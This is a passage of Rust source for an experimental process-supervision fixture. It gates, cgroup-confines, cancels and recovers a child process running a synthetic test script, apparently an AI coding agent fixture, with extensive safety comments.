    pub fn with_same_user_snapshot(
        directory: std::fs::File,
        snapshot: crate::same_user_supervisor::SyntheticFileSnapshot,
    ) -> Self {
        Self {
            same_user_path: Self::fixture_directory_path(&directory),
            same_user_recovery: Some(directory),
            same_user_snapshot: Some(snapshot),
            ..Self::default()
        }
    }

    /// Owns only a disposable synthetic source; never use real project data.
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    pub fn with_synthetic_source(directory: std::fs::File, source: tempfile::TempDir) -> Self {
        Self {
            same_user_path: Self::fixture_directory_path(&directory),
            same_user_recovery: Some(directory),
            synthetic_source: Some(source),
            ..Self::default()
        }
    }

    /// Synthetic bytes only; no assertion that real updates have a known post-image.
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    pub fn with_synthetic_recovery_plan(
        directory: std::fs::File,
        source: tempfile::TempDir,
        postimage: Vec<u8>,
    ) -> Self {
        Self {
            same_user_path: Self::fixture_directory_path(&directory),
            same_user_recovery: Some(directory),
            synthetic_source: Some(source),
            synthetic_postimage: Some(SyntheticPostimage::Present(postimage)),
            ..Self::default()
        }
    }

    /// Synthetic two-file fixture only; the encoded post-image is bounded.
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    pub fn with_synthetic_two_file_plan(
        directory: std::fs::File,
        source: tempfile::TempDir,
        expected: &crate::same_user_supervisor::SyntheticFileSnapshot,
    ) -> std::io::Result<Self> {
        if !expected.valid() {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidInput,
                "invalid synthetic two-file plan",
            ));
        }
        let postimage = serde_json::to_vec(expected).map_err(std::io::Error::other)?;
        if postimage.len() > 65536 {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidInput,
                "synthetic two-file plan too large",
            ));
        }
        Ok(Self {
            same_user_path: Self::fixture_directory_path(&directory),
            same_user_recovery: Some(directory),
            synthetic_source: Some(source),
            synthetic_postimage: Some(SyntheticPostimage::TwoFiles(postimage)),
            ..Self::default()
        })
    }

    /// Fixture only: the synthetic manifest is expected to be absent.
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    pub fn with_synthetic_absent_postimage(
        directory: std::fs::File,
        source: tempfile::TempDir,
    ) -> Self {
        Self {
            same_user_path: Self::fixture_directory_path(&directory),
            same_user_recovery: Some(directory),
            synthetic_source: Some(source),
            synthetic_postimage: Some(SyntheticPostimage::Absent),
            ..Self::default()
        }
    }

    /// Restore only this gate's disposable single-file source after a locally
    /// recorded direct exit. This does not establish descendant cleanup or
    /// authorize Codex, and must never receive real project data.
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    pub fn recover_fixture_source_after_direct_exit(&self) -> std::io::Result<tempfile::TempDir> {
        let state = self
            .state
            .lock()
            .map_err(|_| std::io::Error::other("fixture gate unavailable"))?;
        if !state.fixture_release_succeeded
            || !state.fixture_recovery_ready
            || !self.synthetic_snapshot_matches(&state)
        {
            return Err(std::io::Error::other("fixture recovery unavailable"));
        }
        if !matches!(
            self.synthetic_postimage,
            Some(SyntheticPostimage::Present(_) | SyntheticPostimage::Absent)
        ) {
            return Err(std::io::Error::other(
                "fixture single-file plan unavailable",
            ));
        }
        let source = self
            .synthetic_source
            .as_ref()
            .ok_or_else(|| std::io::Error::other("fixture source unavailable"))?;
        let path = self
            .same_user_path
            .as_deref()
            .ok_or_else(|| std::io::Error::other("fixture recovery unavailable"))?;
        let inspection = crate::same_user_supervisor::inspect_recovery(path);
        if inspection.local_evidence
            != crate::recovery_state::LocalRecoveryEvidence::PendingDirectExitRecorded
        {
            return Err(std::io::Error::other("fixture direct exit unavailable"));
        }
        let directory = self
            .same_user_recovery
            .as_ref()
            .ok_or_else(|| std::io::Error::other("fixture recovery unavailable"))?;
        crate::same_user_supervisor::reopen_synthetic_attempt_after_exit_in(path, directory, source)
    }

    /// Observe only this gate's disposable single-file fixture after rollback.
    /// The result is diagnostic, non-atomic, and never authorizes Codex.
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    pub fn inspect_fixture_source_after_rollback(
        &self,
    ) -> crate::same_user_supervisor::SyntheticTargetObservation {
        self.inspect_fixture_source_with(
            crate::same_user_supervisor::inspect_synthetic_rollback_target_in,
        )
    }

    /// Observe a resumed fixture record, without treating it as authorization.
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    pub fn inspect_fixture_source_after_resume(
        &self,
    ) -> crate::same_user_supervisor::SyntheticTargetObservation {
        self.inspect_fixture_source_with(
            crate::same_user_supervisor::inspect_synthetic_resume_target_in,
        )
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    fn inspect_fixture_source_with(
        &self,
        inspect: fn(
            &std::path::Path,
            &std::fs::File,
            &tempfile::TempDir,
        ) -> crate::same_user_supervisor::SyntheticTargetObservation,
    ) -> crate::same_user_supervisor::SyntheticTargetObservation {
        use crate::same_user_supervisor::SyntheticTargetObservation;
        let Ok(state) = self.state.lock() else {
            return SyntheticTargetObservation::UnavailableOrInvalid;
        };
        if !state.fixture_release_succeeded
            || !state.fixture_recovery_ready
            || !matches!(
                self.synthetic_postimage,
                Some(SyntheticPostimage::Present(_) | SyntheticPostimage::Absent)
            )
            || !self.synthetic_snapshot_matches(&state)
        {
            return SyntheticTargetObservation::UnavailableOrInvalid;
        }
        let (Some(path), Some(directory), Some(source)) = (
            &self.same_user_path,
            &self.same_user_recovery,
            &self.synthetic_source,
        ) else {
            return SyntheticTargetObservation::UnavailableOrInvalid;
        };
        let result = inspect(path, directory, source);
        if !self.synthetic_snapshot_matches(&state) {
            return SyntheticTargetObservation::UnavailableOrInvalid;
        }
        result
    }

    /// Reconcile an interrupted synthetic record for this gate's owned target.
    /// This neither changes the target nor proves cleanup or enables Codex.
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    pub fn resume_fixture_source_after_direct_exit(&self) -> std::io::Result<()> {
        let state = self
            .state
            .lock()
            .map_err(|_| std::io::Error::other("fixture gate unavailable"))?;
        if !state.fixture_release_succeeded
            || !state.fixture_recovery_ready
            || !matches!(
                self.synthetic_postimage,
                Some(SyntheticPostimage::Present(_) | SyntheticPostimage::Absent)
            )
            || !self.synthetic_snapshot_matches(&state)
        {
            return Err(std::io::Error::other("fixture recovery unavailable"));
        }
        let (Some(path), Some(source)) = (&self.same_user_path, &self.synthetic_source) else {
            return Err(std::io::Error::other("fixture recovery unavailable"));
        };
        let directory = self
            .same_user_recovery
            .as_ref()
            .ok_or_else(|| std::io::Error::other("fixture recovery unavailable"))?;
        crate::same_user_supervisor::resume_reopened_synthetic_attempt_after_exit_in(
            path, directory, source,
        )?;
        if !self.synthetic_snapshot_matches(&state) {
            return Err(std::io::Error::other("fixture recovery changed"));
        }
        Ok(())
    }
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    pub(crate) fn with_fixture_recovery(
        marker: std::sync::Arc<crate::codex_supervision::FixtureRecoveryMarker>,
    ) -> Self {
        Self {
            recovery_marker: Some(marker),
            ..Self::default()
        }
    }
    /// A poisoned control is treated as cancelled; this is a cooperative
    /// checkpoint, not an atomic guarantee against a concurrent start.
    fn is_cancelled(&self) -> bool {
        match self.state.lock() {
            Ok(state) => state.cancelled,
            Err(_) => true,
        }
    }

    pub fn cancel(&self) -> Result<(), &'static str> {
        self.cancel_with_unit().map(|_| ())
    }

    /// Returns whether fixture startup began or a unit was attached, not
    /// whether any resources were created or cleaned.
    pub(crate) fn cancel_with_unit(&self) -> Result<bool, &'static str> {
        let mut state = self.state.lock().map_err(|_| "fixture gate unavailable")?;
        state.cancelled = true;
        #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
        {
            if state.cancellation_failed {
                return Err("fixture cancellation unavailable");
            }
            if let Some(mut kill) = state.kill.take() {
                if kill.request_stop().is_err() {
                    state.cancellation_failed = true;
                    return Err("fixture cancellation unavailable");
                }
            }
        }
        #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
        if state.fixture_starting {
            return Ok(true);
        }
        Ok(state.had_unit)
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    pub(crate) fn begin_fixture_start(&self) -> Result<(), &'static str> {
        let mut state = self.state.lock().map_err(|_| "fixture gate unavailable")?;
        if state.cancelled {
            return Err("fixture startup cancelled");
        }
        if state.fixture_starting || state.had_unit {
            return Err("fixture startup already begun");
        }
        state.fixture_starting = true;
        if !self.fixture_recovery_location_matches() {
            return Err("fixture recovery unavailable");
        }
        if self.recovery_marker.is_some() || self.same_user_recovery.is_some() {
            let uuid = std::fs::read_to_string("/proc/sys/kernel/random/uuid")
                .map_err(|_| "fixture recovery unavailable")?;
            let identity = uuid.trim().replace('-', "");
            if let Some(directory) = &self.same_user_recovery {
                let owned = directory
                    .try_clone()
                    .map_err(|_| "fixture recovery unavailable")?;
                let path = self
                    .same_user_path
                    .as_deref()
                    .ok_or("fixture recovery unavailable")?;
                let pending =
                    crate::same_user_supervisor::PendingAttempt::begin_in(owned, path, &identity)
                        .map_err(|_| "fixture recovery unavailable")?;
                if let Some(snapshot) = &self.same_user_snapshot {
                    pending
                        .store_synthetic_files(snapshot)
                        .map_err(|_| "fixture recovery unavailable")?;
                }
                if let Some(source) = &self.synthetic_source {
                    state.captured_snapshot = Some(
                        pending
                            .capture_synthetic_files(source)
                            .map_err(|_| "fixture recovery unavailable")?,
                    );
                }
                if let Some(postimage) = &self.synthetic_postimage {
                    match postimage {
                        SyntheticPostimage::Present(bytes) => {
                            pending.store_synthetic_postimage(bytes)
                        }
                        SyntheticPostimage::Absent => pending.store_synthetic_absent_postimage(),
                        SyntheticPostimage::TwoFiles(bytes) => {
                            let snapshot = serde_json::from_slice(bytes)
                                .map_err(|_| "fixture recovery unavailable")?;
                            pending.store_synthetic_two_file_postimage(&snapshot)
                        }
                    }
                    .map_err(|_| "fixture recovery unavailable")?;
                }
                state.fixture_intent = Some(identity.clone());
                state.same_user_pending = Some(pending);
            }
            if let Some(marker) = &self.recovery_marker {
                marker
                    .arm_with_identity(&identity)
                    .map_err(|_| "fixture recovery unavailable")?;
            }
        }
        state.fixture_recovery_ready = true;
        Ok(())
    }

    /// A PID is only a local diagnostic locator, never restart adoption proof.
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    fn record_same_user_child(
        &self,
        child: &mut std::process::Child,
    ) -> Result<Option<FixtureExitRecord>, &'static str> {
        let Some(directory) = &self.same_user_recovery else {
            return Ok(None);
        };
        let mut state = self
            .state
            .lock()
            .map_err(|_| "fixture recovery unavailable")?;
        if state.cancelled || !state.fixture_child_started || !state.fixture_recovery_ready {
            return Err("fixture recovery unavailable");
        }
        if !self.synthetic_snapshot_matches(&state) || !self.synthetic_source_matches(&state) {
            state.fixture_recovery_ready = false;
            return Err("fixture recovery unavailable");
        }
        let identity = state
            .fixture_intent
            .as_deref()
            .ok_or("fixture recovery unavailable")?
            .to_owned();
        let pending = state
            .same_user_pending
            .take()
            .ok_or("fixture recovery unavailable")?;
        let observed = pending
            .bind_child(child)
            .map_err(|_| "fixture recovery unavailable")?;
        // The child remains owned by the fixture. This observation grants no
        // release permission or proof of descendant cleanup.
        drop(observed);
        Ok(Some(FixtureExitRecord {
            directory: directory
                .try_clone()
                .map_err(|_| "fixture recovery unavailable")?,
            path: self
                .same_user_path
                .clone()
                .ok_or("fixture recovery unavailable")?,
            attempt: identity,
        }))
    }

    // Fixture only: reserve one spawn under the lock, then release it before
    // starting the child. A late child stays gated and is stopped on cancel.
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    fn start_fixture_child(
        &self,
        spawn: impl FnOnce() -> std::io::Result<std::process::Child>,
    ) -> Result<FixtureSpawnedChild<'_>, &'static str> {
        self.start_fixture_child_using(spawn, stop_fixture_direct_child)
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    fn start_fixture_child_using(
        &self,
        spawn: impl FnOnce() -> std::io::Result<std::process::Child>,
        stop: impl FnOnce(&mut std::process::Child) -> bool,
    ) -> Result<FixtureSpawnedChild<'_>, &'static str> {
        {
            let mut state = self.state.lock().map_err(|_| "fixture gate unavailable")?;
            if state.cancelled {
                return Err("fixture startup cancelled");
            }
            if !state.fixture_starting || !state.fixture_recovery_ready {
                return Err("fixture startup not begun");
            }
            if state.fixture_child_started {
                return Err("fixture child start already attempted");
            }
            if !self.synthetic_snapshot_matches(&state) {
                state.fixture_recovery_ready = false;
                return Err("fixture recovery unavailable");
            }
            if !self.synthetic_source_matches(&state) {
                state.fixture_recovery_ready = false;
                return Err("fixture recovery unavailable");
            }
            state.fixture_child_started = true;
        }
        let child = spawn().map_err(|_| "fixture child unavailable")?;
        let mut spawned = FixtureSpawnedChild {
            child: Some(child),
            gate: self,
        };
        if self.is_cancelled() {
            return Err(spawned.reject_with_cleanup("fixture startup cancelled", stop));
        }
        Ok(spawned)
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    fn synthetic_source_matches(&self, state: &FixtureStartGateState) -> bool {
        let Some(source) = &self.synthetic_source else {
            return true;
        };
        state.captured_snapshot.as_ref().is_some_and(|expected| {
            crate::same_user_supervisor::read_synthetic_source(source)
                .is_ok_and(|observed| observed == *expected)
        })
    }

    // Point-in-time evidence only; not atomic with spawn or gate release.
    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    fn synthetic_snapshot_matches(&self, state: &FixtureStartGateState) -> bool {
        if !self.fixture_recovery_location_matches() {
            return false;
        }
        if let Some(expected) = &self.synthetic_postimage {
            let matches =
                self.same_user_recovery
                    .as_ref()
                    .is_some_and(|directory| match expected {
                        SyntheticPostimage::Present(bytes) => {
                            crate::recovery_state::fixture_read_postimage_state(directory)
                                .is_ok_and(|observed| observed.as_ref() == Some(bytes))
                        }
                        SyntheticPostimage::Absent => {
                            crate::recovery_state::fixture_read_postimage_state(directory)
                                .is_ok_and(|observed| observed.is_none())
                        }
                        SyntheticPostimage::TwoFiles(bytes) => {
                            crate::recovery_state::fixture_read_multi_postimage(directory)
                                .is_ok_and(|observed| observed == *bytes)
                        }
                    });
            if !matches {
                return false;
            }
        }
        let Some(expected) = self
            .same_user_snapshot
            .as_ref()
            .or(state.captured_snapshot.as_ref())
        else {
            return true;
        };
        self.same_user_recovery.as_ref().is_some_and(|directory| {
            crate::recovery_state::read_recovery_snapshot(directory)
                .ok()
                .and_then(|bytes| {
                    serde_json::from_slice::<crate::same_user_supervisor::SyntheticFileSnapshot>(
                        &bytes,
                    )
                    .ok()
                })
                .is_some_and(|observed| observed == *expected)
        })
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    fn fixture_directory_path(directory: &std::fs::File) -> Option<std::path::PathBuf> {
        use std::os::fd::AsRawFd;
        std::fs::read_link(format!("/proc/self/fd/{}", directory.as_raw_fd())).ok()
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    fn fixture_recovery_location_matches(&self) -> bool {
        match (&self.same_user_recovery, &self.same_user_path) {
            (None, _) => true,
            (Some(directory), Some(path)) => {
                crate::same_user_supervisor::verify_named_recovery_directory(path, directory)
                    .is_ok()
            }
            (Some(_), None) => false,
        }
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    pub(crate) fn attach_kill(
        &self,
        kill: crate::codex_supervision::FixtureKillHandle,
    ) -> Result<(), &'static str> {
        #[cfg(test)]
        if let Some((ready, resume)) = self
            .before_attach_checkpoint
            .lock()
            .map_err(|_| "fixture checkpoint unavailable")?
            .take()
        {
            ready
                .send(())
                .map_err(|_| "fixture checkpoint unavailable")?;
            resume
                .recv_timeout(Duration::from_secs(10))
                .map_err(|_| "fixture checkpoint unavailable")?;
        }
        let mut state = self.state.lock().map_err(|_| "fixture gate unavailable")?;
        if state.cancelled {
            return Err("fixture startup cancelled");
        }
        if !state.fixture_starting {
            return Err("fixture startup not begun");
        }
        if state.had_unit {
            return Err("fixture unit already attached");
        }
        state.had_unit = true;
        state.kill = Some(kill);
        Ok(())
    }

    #[cfg(all(test, target_os = "linux", feature = "codex-fixture"))]
    pub(crate) fn attach_synthetic_kill(&self, file: std::fs::File) -> Result<(), &'static str> {
        self.attach_kill(crate::codex_supervision::FixtureKillHandle::synthetic(file))
    }

    #[cfg(all(test, target_os = "linux", feature = "codex-fixture"))]
    pub(crate) fn inject_fixture_kill_failure(&self) {
        let full = std::fs::OpenOptions::new()
            .write(true)
            .open("/dev/full")
            .unwrap();
        let mut state = self.state.lock().unwrap();
        assert!(state.kill.is_some() && !state.cancelled);
        state.kill = Some(crate::codex_supervision::FixtureKillHandle::synthetic(full));
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    fn release(&self, gate: &mut impl std::io::Write) -> Result<(), &'static str> {
        let mut state = self.state.lock().map_err(|_| "fixture gate unavailable")?;
        if state.cancelled {
            return Err("fixture startup cancelled");
        }
        if !state.fixture_child_started || !state.had_unit || state.kill.is_none() {
            return Err("fixture child not admitted");
        }
        if state.fixture_gate_released {
            return Err("fixture gate already released");
        }
        if !state.fixture_recovery_ready
            || !self.synthetic_snapshot_matches(&state)
            || !self.synthetic_source_matches(&state)
        {
            state.fixture_recovery_ready = false;
            return Err("fixture recovery unavailable");
        }
        // A partial or failed write must not allow another release attempt.
        state.fixture_gate_released = true;
        gate.write_all(b"1")
            .map_err(|_| "fixture gate release failed")?;
        state.fixture_release_succeeded = true;
        Ok(())
    }
}

#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
fn stop_fixture_direct_child(child: &mut std::process::Child) -> bool {
    stop_fixture_direct_child_until(child, std::time::Instant::now() + Duration::from_secs(1))
}

#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
fn stop_fixture_direct_child_until(
    child: &mut std::process::Child,
    deadline: std::time::Instant,
) -> bool {
    let _ = child.kill();
    while std::time::Instant::now() < deadline {
        match child.try_wait() {
            Ok(Some(_)) => return true,
            Err(_) => return false,
            Ok(None) => std::thread::sleep(Duration::from_millis(10)),
        }
    }
    false
}

#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
fn wait_for_broken_fixture_gate(
    child: &mut std::process::Child,
    marker: &std::path::Path,
    mut poll: impl FnMut(&mut std::process::Child) -> std::io::Result<Option<std::process::ExitStatus>>,
) -> Result<(), &'static str> {
    let deadline = std::time::Instant::now() + Duration::from_secs(3);
    while !marker.exists() {
        match poll(child) {
            Ok(Some(_)) => return Err("broken gate fixture unavailable"),
            Err(_) => {
                let _ = stop_fixture_direct_child(child);
                return Err("broken gate fixture unavailable");
            }
            Ok(None) if std::time::Instant::now() >= deadline => {
                let _ = stop_fixture_direct_child(child);
                return Err("broken gate fixture unavailable");
            }
            Ok(None) => std::thread::sleep(Duration::from_millis(10)),
        }
    }
    Ok(())
}

#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
fn wait_for_fixture_child_after_cancel(
    child: &mut std::process::Child,
    reaped: &mut bool,
    deadline: std::time::Instant,
    mut poll: impl FnMut(&mut std::process::Child) -> std::io::Result<Option<std::process::ExitStatus>>,
) -> Result<(), &'static str> {
    use std::os::unix::process::ExitStatusExt;
    loop {
        match poll(child) {
            Ok(Some(status)) => {
                *reaped = true;
                return if status.signal() == Some(9) {
                    Ok(())
                } else {
                    Err("fixture child did not terminate by SIGKILL")
                };
            }
            Ok(None) if std::time::Instant::now() < deadline => {
                std::thread::sleep(Duration::from_millis(10));
            }
            result => {
                let error = if result.is_err() {
                    "fixture child wait failed"
                } else {
                    "fixture child cancellation timed out"
                };
                *reaped = stop_fixture_direct_child_until(child, deadline);
                return Err(error);
            }
        }
    }
}

#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
#[doc(hidden)]
pub fn fixture_close_extra_descriptors_on_exec(command: &mut std::process::Command) {
    fixture_close_extra_descriptors_with_flags(command, libc::CLOSE_RANGE_CLOEXEC);
}

#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
fn fixture_close_extra_descriptors_with_flags(command: &mut std::process::Command, flags: u32) {
    use std::os::unix::process::CommandExt;
    // SAFETY: this post-fork hook performs only the async-signal-safe syscall
    // and constructs an OS error on failure. CLOEXEC preserves Rust's exec
    // error pipe until exec, so errors remain reportable to the parent.
    unsafe {
        command.pre_exec(move || {
            let result = libc::syscall(libc::SYS_close_range, 3_u32, u32::MAX, flags);
            if result == -1 {
                return Err(std::io::Error::last_os_error());
            }
            Ok(())
        });
    }
}

#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
impl FixtureSupervisedChild {
    /// Combines only fixture observations bound to this child's local attempt.
    /// This is not an atomic snapshot, cleanup proof, or result promotion.
    pub fn inspect_fixture_review(
        &self,
        gate: &FixtureStartGate,
    ) -> Option<FixtureReviewObservation> {
        use std::os::unix::fs::MetadataExt;
        let context = self.recovery_exit.as_ref()?;
        let matches_gate = || -> Option<()> {
            let state = gate.state.lock().ok()?;
            if state.fixture_intent.as_deref()? != context.attempt
                || !gate.fixture_recovery_location_matches()
            {
                return None;
            }
            let held = gate.same_user_recovery.as_ref()?.metadata().ok()?;
            let child = context.directory.metadata().ok()?;
            if (held.dev(), held.ino()) != (child.dev(), child.ino()) {
                return None;
            }
            crate::same_user_supervisor::verify_named_recovery_directory(
                &context.path,
                &context.directory,
            )
            .ok()?;
            Some(())
        };
        matches_gate()?;
        let recovery = crate::same_user_supervisor::inspect_recovery(&context.path);
        let observation = FixtureReviewObservation {
            response_quarantined: self.attempt._pending.is_some(),
            direct_exit: recovery.direct_exit,
            rollback_target: gate.inspect_fixture_source_after_rollback(),
            resume_target: gate.inspect_fixture_source_after_resume(),
            descendant_cleanup: recovery.descendant_cleanup,
            rollback: recovery.rollback,
        };
        matches_gate()?;
        Some(observation)
    }

    /// Starts only the experimental fixture. This is not a sandbox: `script`
    /// must be the local synthetic fixture, never untrusted application input.
    pub fn spawn_fixture(
        directory: &std::path::Path,
        codex_dir: &std::path::Path,
        script: &std::path::Path,
        broken_gate: bool,
    ) -> Result<Self, &'static str> {
        Self::spawn_fixture_cancellable(
            directory,
            codex_dir,
            script,
            broken_gate,
            &FixtureStartGate::default(),
        )
    }

    /// Fixture-only startup; cancellation and gate release are serialized.
    pub fn spawn_fixture_cancellable(
        directory: &std::path::Path,
        codex_dir: &std::path::Path,
        script: &std::path::Path,
        broken_gate: bool,
        start_gate: &FixtureStartGate,
    ) -> Result<Self, &'static str> {
        Self::spawn_fixture_with_startup_check(
            directory,
            codex_dir,
            script,
            broken_gate,
            start_gate,
            || Ok(()),
        )
    }

    /// Fixture-only hook, run after admission and before gate release. It is
    /// not a trusted production readiness or ownership protocol.
    pub fn spawn_fixture_with_startup_check(
        directory: &std::path::Path,
        codex_dir: &std::path::Path,
        script: &std::path::Path,
        broken_gate: bool,
        start_gate: &FixtureStartGate,
        startup_check: impl FnOnce() -> Result<(), &'static str>,
    ) -> Result<Self, &'static str> {
        start_gate.begin_fixture_start()?;
        #[cfg(test)]
        if let Some((ready, resume)) = start_gate
            .before_create_checkpoint
            .lock()
            .map_err(|_| "fixture checkpoint unavailable")?
            .take()
        {
            ready
                .send(())
                .map_err(|_| "fixture checkpoint unavailable")?;
            resume
                .recv_timeout(Duration::from_secs(10))
                .map_err(|_| "fixture checkpoint unavailable")?;
        }
        // Cooperative only: cancellation can still race a subsequent syscall.
        if start_gate.is_cancelled() {
            return Err("fixture startup cancelled");
        }
        use std::path::{Component, Path};
        let membership =
            std::fs::read_to_string("/proc/self/cgroup").map_err(|_| "cgroup unavailable")?;
        let relative = membership
            .lines()
            .find_map(|line| line.strip_prefix("0::/"))
            .ok_or("cgroup unavailable")?;
        let relative = Path::new(relative);
        if relative
            .components()
            .any(|part| !matches!(part, Component::Normal(_)))
        {
            return Err("invalid fixture cgroup");
        }
        let group = Path::new("/sys/fs/cgroup")
            .join(relative)
            .join("tucupi-child-fixture");
        if let Err(error) = std::fs::create_dir(&group) {
            if error.kind() == std::io::ErrorKind::AlreadyExists {
                return Err("fixture cgroup already exists");
            }
            return Err("fixture cgroup creation unavailable");
        }
        #[cfg(test)]
        if let Some((ready, resume)) = start_gate
            .after_create_checkpoint
            .lock()
            .map_err(|_| "fixture checkpoint unavailable")?
            .take()
        {
            ready
                .send(())
                .map_err(|_| "fixture checkpoint unavailable")?;
            resume
                .recv_timeout(Duration::from_secs(10))
                .map_err(|_| "fixture checkpoint unavailable")?;
        }
        // The empty group is left for the fixture's outer unit to clean up.
        // Neither this check nor the eventual unit teardown proves ownership.
        if start_gate.is_cancelled() {
            return Err("fixture startup cancelled");
        }
        let observation = crate::codex_supervision::CgroupObservation::open(&group)?;
        Self::spawn_fixture_with_observation(
            observation,
            directory,
            codex_dir,
            script,
            broken_gate,
            start_gate,
            startup_check,
        )
    }

    fn spawn_fixture_with_observation(
        observation: crate::codex_supervision::CgroupObservation,
        directory: &std::path::Path,
        codex_dir: &std::path::Path,
        script: &std::path::Path,
        broken_gate: bool,
        start_gate: &FixtureStartGate,
        startup_check: impl FnOnce() -> Result<(), &'static str>,
    ) -> Result<Self, &'static str> {
        use std::process::{Command as StdCommand, Stdio as StdStdio};
        let membership =
            std::fs::read_to_string("/proc/self/cgroup").map_err(|_| "cgroup unavailable")?;
        let relative = membership
            .lines()
            .find_map(|line| line.strip_prefix("0::/"))
            .ok_or("cgroup unavailable")?;
        let relative = std::path::Path::new(relative);
        if relative
            .components()
            .any(|part| !matches!(part, std::path::Component::Normal(_)))
        {
            return Err("invalid fixture cgroup");
        }
        let expected_membership = std::path::Path::new("/")
            .join(relative)
            .join("tucupi-child-fixture");
        let gate = if broken_gate {
            "import os,pathlib,time; os.close(0); pathlib.Path(os.environ['HOME']).joinpath('closed-gate').touch(); time.sleep(20)"
        } else {
            "import os,pathlib,sys\nif sys.stdin.buffer.read(1)!=b'1': sys.exit(90)\nentries=[s[3:] for s in pathlib.Path('/proc/self/cgroup').read_text().splitlines() if s.startswith('0::')]\nif entries != [os.environ['TUCUPI_FIXTURE_EXPECTED_CGROUP']]:\n pathlib.Path(os.environ['HOME']).joinpath('self-check-rejected').touch()\n sys.exit(91)\nos.execv('/usr/bin/python3',['/usr/bin/python3',sys.argv[1]])"
        };
        let mut command = StdCommand::new("/usr/bin/python3");
        command
            .arg("-c")
            .arg(gate)
            .arg(script)
            .env_clear()
            .env("PATH", format!("{}:/usr/bin:/bin", codex_dir.display()))
            .env("HOME", directory)
            .env("TUCUPI_BRIDGE_CANCEL_FIXTURE", directory)
            .env("TUCUPI_BRIDGE_TEST_DIR", directory)
            .env("TUCUPI_FIXTURE_EXPECTED_CGROUP", expected_membership)
            .env("PYTHONUNBUFFERED", "1")
            .stdin(StdStdio::piped())
            .stdout(StdStdio::null())
            .stderr(StdStdio::null());
        #[cfg(test)]
        if start_gate
            .fail_close_range
            .load(std::sync::atomic::Ordering::SeqCst)
        {
            fixture_close_extra_descriptors_with_flags(&mut command, u32::MAX);
        } else {
            fixture_close_extra_descriptors_on_exec(&mut command);
        }
        #[cfg(not(test))]
        fixture_close_extra_descriptors_on_exec(&mut command);
        let mut spawned = start_gate.start_fixture_child(|| command.spawn())?;
        if broken_gate {
            let marker = directory.join("closed-gate");
            let child = spawned.child.as_mut().ok_or("fixture child unavailable")?;
            wait_for_broken_fixture_gate(child, &marker, std::process::Child::try_wait)?;
        }
        Self::admit_and_release(observation, spawned, startup_check)
    }

    /// Admission is private to the fixture-controlled spawn path. The gate is
    /// released only after admission and binding have both succeeded.
    fn admit_and_release(
        observation: crate::codex_supervision::CgroupObservation,
        mut spawned: FixtureSpawnedChild<'_>,
        startup_check: impl FnOnce() -> Result<(), &'static str>,
    ) -> Result<Self, &'static str> {
        let start_gate = spawned.gate;
        let admission = (|| {
            let child = spawned.child.as_mut().ok_or("fixture child unavailable")?;
            let gate = child.stdin.take().ok_or("fixture gate unavailable")?;
            #[cfg(test)]
            if start_gate
                .admission_panic
                .load(std::sync::atomic::Ordering::SeqCst)
            {
                panic!("synthetic fixture admission panic");
            }
            observation.admit_fixture_child(child)?;
            let kill = observation.fixture_kill_handle()?;
            let sequence = crate::codex_supervision::CgroupSequence::new(observation);
            let attempt = FixtureReviewAttempt::start(sequence)?;
            Ok::<_, &'static str>((gate, kill, attempt))
        })();
        let (mut gate, kill, attempt) = match admission {
            Ok(admitted) => admitted,
            Err(error) => return Err(spawned.reject_with_cleanup(error, stop_fixture_direct_child)),
        };
        let child = spawned.child.take().ok_or("fixture child unavailable")?;
        let mut supervised = Self {
            attempt,
            child,
            reaped: false,
            recovery_exit: None,
        };
        if let Err(error) = start_gate.attach_kill(kill) {
            return Err(supervised.reject_after_admission(error));
        }
        supervised.recovery_exit = match start_gate.record_same_user_child(&mut supervised.child) {
            Ok(context) => context,
            Err(error) => return Err(supervised.reject_after_admission(error)),
        };
        if let Err(error) = startup_check() {
            return Err(supervised.reject_after_admission(error));
        }
        #[cfg(test)]
        if let Some((ready, resume)) = start_gate
            .checkpoint
            .lock()
            .map_err(|_| "fixture checkpoint unavailable")?
            .take()
        {
            ready
                .send(())
                .map_err(|_| "fixture checkpoint unavailable")?;
            resume
                .recv_timeout(Duration::from_secs(10))
                .map_err(|_| "fixture checkpoint unavailable")?;
        }
        if start_gate.is_cancelled() {
            return Err(supervised.reject_after_admission("fixture startup cancelled"));
        }
        if let Err(error) = supervised
            .attempt
            .sequence
            .verify_fixture_child(&mut supervised.child)
        {
            return Err(supervised.reject_after_admission(error));
        }
        #[cfg(test)]
        if let Some((ready, resume)) = start_gate
            .after_verify_checkpoint
            .lock()
            .map_err(|_| "fixture checkpoint unavailable")?
            .take()
        {
            ready
                .send(())
                .map_err(|_| "fixture checkpoint unavailable")?;
            resume
                .recv_timeout(Duration::from_secs(10))
                .map_err(|_| "fixture checkpoint unavailable")?;
        }
        if let Err(error) = start_gate.release(&mut gate) {
            return Err(supervised.reject_after_admission(error));
        }
        drop(gate);
        #[cfg(test)]
